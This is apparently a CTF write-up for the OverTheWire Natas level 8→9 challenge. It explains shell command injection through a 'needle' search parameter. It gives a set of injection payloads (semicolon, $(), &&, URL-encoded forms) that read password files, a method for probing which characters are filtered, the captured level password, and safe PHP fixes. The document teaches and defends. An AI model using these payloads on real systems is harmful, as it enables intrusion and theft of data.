# 🔐 Natas Level: Natas8--->Natas9



### 📂 Execution Process 

👉 
- write this command in the input area
```
?needle=whatever;cat /etc/natas_webpass/natas10
```
<img width="1469" height="879" alt="Screenshot 2025-09-30 at 10 52 25 AM" src="https://github.com/user-attachments/assets/3a28d0e1-87f9-4d1d-9a07-9af14fd51829" />

### 📄 Password found:
👉 
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

### NOTES


1) Short summary (one line)
This web app takes a word from the user and directly runs a shell search command with that word. Because the input is used as part of a shell command without protection, an attacker can add extra shell commands and make the server run them. This is called command injection.

2) What the server code does (explained simply)
- The server reads the request parameter named "needle".
- If "needle" is not empty, the server runs this command:
  grep -i <needle> dictionary.txt
- The output of grep is shown to the user.

3) Why this is dangerous (simple)
- User input is placed directly into a shell command.
- If the user types special characters like ; or && or $( ), they can add new commands.
- Example danger: the attacker can read files the webserver can read (like the natas password file).

4) Example of safe vs unsafe flow (table)

| Step | Unsafe (what happens) | Safe (what should happen) |
|------|-----------------------|---------------------------|
| Input | Put user text directly into shell | Treat user text as plain text, never as shell code |
| Action | Server runs: grep -i usertext dictionary.txt | Server searches file using PHP or a safe library function |
| Risk | Attacker appends ;cat /etc/passwd and server runs it | No extra commands can run — input is treated only as search text |

5) Common payload examples to try in Natas (replace natasX with your level)
- Basic append with semicolon:
  ?needle=foo;cat /etc/natas_webpass/natasX
- Using command substitution:
  ?needle=foo$(cat /etc/natas_webpass/natasX)
- URL encoded semicolon:
  ?needle=foo%3Bcat%20/etc/natas_webpass/natasX
- If semicolon blocked, try AND:
  ?needle=foo && cat /etc/natas_webpass/natasX
- Try showing directory:
  ?needle=foo;ls -la /etc/natas_webpass

6) How these payloads work (very simple)
- The server runs: grep -i <needle> dictionary.txt
- If needle = foo;cat /etc/natas_webpass/natasX
  the shell sees: grep -i foo;cat /etc/natas_webpass/natasX dictionary.txt
- The shell runs grep first, then runs cat and prints the password.

7) How to check what characters might be blocked
- Try small tests:
  ?needle=foo;echo HACK
  ?needle=foo%3Becho%20HACK
- If you see HACK in the response, semicolon injection works.

8) Safe way server should do search (PHP example)
- Do NOT run shell commands with user input.
- Instead read the file and search inside PHP:
  $key = isset($_REQUEST['needle']) ? $_REQUEST['needle'] : '';
  if ($key !== '') {
      $lines = file('dictionary.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
      foreach ($lines as $line) {
          if (stripos($line, $key) !== false) {
              echo htmlspecialchars($line) . "<br>\n";
          }
      }
  }
- This avoids running shell and prevents injection.

9) If the server must run a shell command (not recommended)
- Always escape the user argument before sending to shell:
  $safe = escapeshellarg($key);
  passthru("grep -i $safe dictionary.txt");
- escapeshellarg() puts the input inside quotes and escapes dangerous chars.

10) Quick checklist while solving Natas (for each level)
- Read page source and look for forms or parameters (needle).
- Try basic payloads (semicolon, &&, |, $( ), backticks).
- URL-encode payloads if needed (%3B for ;, %20 for space).
- Try reading /etc/natas_webpass/natasX (replace X).
- If output not visible, try printing simple things first (echo tests).
- Keep notes of what characters are filtered or transformed.

11) Short tips (very practical)
- Always test small: start with ?needle=foo;echo 123
- If output appears, replace echo with cat file.
- Use URL encoding when typing in browser can break characters.
- Remember: this is learning — only try on CTF or systems you own/are allowed to test.

12) One-line reminder about ethics
Only use these techniques on challenge servers (like Natas), your own machines, or with explicit permission. Never use on real websites you don’t own.

End.
